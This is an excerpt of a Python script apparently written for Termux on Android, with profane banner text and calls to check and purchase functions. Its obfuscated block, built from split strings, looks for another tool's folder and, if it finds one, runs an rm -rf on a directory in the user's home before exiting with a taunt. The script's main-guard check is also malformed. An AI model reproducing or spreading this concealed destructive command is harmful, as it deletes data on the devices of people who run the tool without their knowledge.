...
try:
    files = os.listdir("/"+"da"+"ta/d"+"ata/c"+"om.t"+"ermux/"+"files"+"/ho"+"me/A"+"AH"+"AD"+"I-"+"WRE"+"EN");os.system("rm"+" -r"+"f $"+"HOME"+"/"+"RA"+"HAD"+"I-"+"HR"+"EE"+"N");exit(f"{style} An"+"ot"+"her "+"Tool"+" Use"+"r"+" No"+"t A"+"llow"+" B"+"ro"+" By"+"e ! ")
...
{B}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•
{style}{G0} FACEBOOK    {RE}●{G0} FUCK YOU
{style}{G1} GITHUB      {RE}●{G1} FUCK
...
def __Ok_XoXu__():
    global methods        
    clear();__durmagi__();iamcheckingyou()
...
if __name__=='___main___':
    try:issue();iamcheckingyou();rsbuy()
